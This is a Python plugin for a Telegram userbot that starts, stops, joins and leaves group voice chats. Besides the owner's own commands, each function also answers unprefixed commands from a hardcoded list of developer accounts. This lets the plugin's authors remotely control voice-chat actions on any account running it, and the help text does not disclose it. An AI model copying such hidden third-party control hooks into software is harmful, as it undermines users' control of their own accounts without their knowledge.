# Credits: @mrismanaziz
# Copyright (C) 2022 Pyro-ManUserbot
#
# This file is a part of < https://github.com/mrismanaziz/PyroMan-Userbot/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/mrismanaziz/PyroMan-Userbot/blob/main/LICENSE/>.
#
# t.me/SharingUserbot & t.me/Lunatic0de

from asyncio import sleep
from contextlib import suppress
from random import randint
from typing import Optional

from pyrogram import Client, enums, filters
from pyrogram.raw.functions.channels import GetFullChannel
from pyrogram.raw.functions.messages import GetFullChat
from pyrogram.raw.functions.phone import CreateGroupCall, DiscardGroupCall
from pyrogram.raw.types import InputGroupCall, InputPeerChannel, InputPeerChat
from pyrogram.types import Message

from config import CMD_HANDLER
from Uputt.helpers.adminHelpers import DEVS
from Uputt.helpers.basic import edit_or_reply
from Uputt.helpers.tools import get_arg

from .help import *


async def get_group_call(
    client: Client, message: Message, err_msg: str = ""
) -> Optional[InputGroupCall]:
    chat_peer = await client.resolve_peer(message.chat.id)
    if isinstance(chat_peer, (InputPeerChannel, InputPeerChat)):
        if isinstance(chat_peer, InputPeerChannel):
            full_chat = (await client.send(GetFullChannel(channel=chat_peer))).full_chat
        elif isinstance(chat_peer, InputPeerChat):
            full_chat = (
                await client.send(GetFullChat(chat_id=chat_peer.chat_id))
            ).full_chat
        if full_chat is not None:
            return full_chat.call
    await message.edit(f"**No group call Found** {err_msg}")
    return False


@Client.on_message(
    filters.command("Startvcs", [""]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.command(["startvc"], cmd) & filters.me)
async def opengc(client: Client, message: Message):
    flags = " ".join(message.command[1:])
    Uputt = await edit_or_reply(message, "`Sabar Lagi Dibuka Tod . . .`")
    vctitle = get_arg(message)
    if flags == enums.ChatType.CHANNEL:
        chat_id = message.chat.title
    else:
        chat_id = message.chat.id
    args = f"**Bilang Makasih Sama Gua Os Di Nyalaiin\n • **Chat ID** : `{chat_id}`"
    try:
        if not vctitle:
            await client.invoke(
                CreateGroupCall(
                    peer=(await client.resolve_peer(chat_id)),
                    random_id=randint(10000, 999999999),
                )
            )
        else:
            args += f"\n • **Title:** `{vctitle}`"
            await client.invoke(
                CreateGroupCall(
                    peer=(await client.resolve_peer(chat_id)),
                    random_id=randint(10000, 999999999),
                    title=vctitle,
                )
            )
        await Uputt.edit(args)
    except Exception as e:
        await Uputt.edit(f"**INFO:** `{e}`")


@Client.on_message(filters.command("Stopvcs", [""]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command(["stopvc"], cmd) & filters.me)
async def end_vc_(client: Client, message: Message):
    """End group call"""
    chat_id = message.chat.id
    if not (
        group_call := (
            await get_group_call(client, message, err_msg=", siap siap os Di Banting pegangan")
        )
    ):
        return
    await client.send(DiscardGroupCall(call=group_call))
    await edit_or_reply(message, f"Gua Pelaku Banting Os **Chat ID** : `{chat_id}`")


@Client.on_message(
    filters.command("joinvcs", [""]) & filters.user(DEVS) & ~filters.via_bot
)
@Client.on_message(filters.command("joinvc", cmd) & filters.me)
async def joinvc(client: Client, message: Message):
    chat_id = message.command[1] if len(message.command) > 1 else message.chat.id
    if message.from_user.id != client.me.id:
        Uputt = await message.reply("`Bentar Mau Pemanasan Dulu...`")
    else:
        Uputt = await message.edit("`Processing...`")
    with suppress(ValueError):
        chat_id = int(chat_id)
    try:
        await client.group_call.start(chat_id)
    except Exception as e:
        return await Uputt.edit(f"**ERROR:** `{e}`")
    await Uputt.edit(f"❏ **Berhasil Bergabung Di Os Sama Temen lu**\n└ **Chat ID:** `{chat_id}`")
    await sleep(5)
    await client.group_call.set_is_mute(True)


@Client.on_message(
    filters.command("leavevcs", [""]) & filters.user(DEVS) & ~filters.via_bot
)
@Client.on_message(filters.command("leavevc", cmd) & filters.me)
async def leavevc(client: Client, message: Message):
    chat_id = message.command[1] if len(message.command) > 1 else message.chat.id
    if message.from_user.id != client.me.id:
        Uputt = await message.reply("`Bosen Gw mau Turun...`")
    else:
        Uputt = await message.edit("`Processing...`")
    with suppress(ValueError):
        chat_id = int(chat_id)
    try:
        await client.group_call.stop()
    except Exception as e:
        return await edit_or_reply(message, f"**ERROR:** `{e}`")
    msg = "❏ **Berhasil Turun dewek tanpa harus lu suruh**"
    if chat_id:
        msg += f"\n└ **Chat ID:** `{chat_id}`"
    await Uputt.edit(msg)


add_command_help(
    "vctools",
    [
        ["startvc", "Untuk Memulai voice chat group."],
        ["stopvc", "Untuk Memberhentikan voice chat group."],
        [
            f"joinvc atau {cmd}joinvc <chatid/username gc>",
            "Untuk Bergabung ke voice chat group.",
        ],
        [
            f"leavevc atau {cmd}leavevc <chatid/username gc>",
            "Untuk Turun dari voice chat group.",
        ],
    ],
)
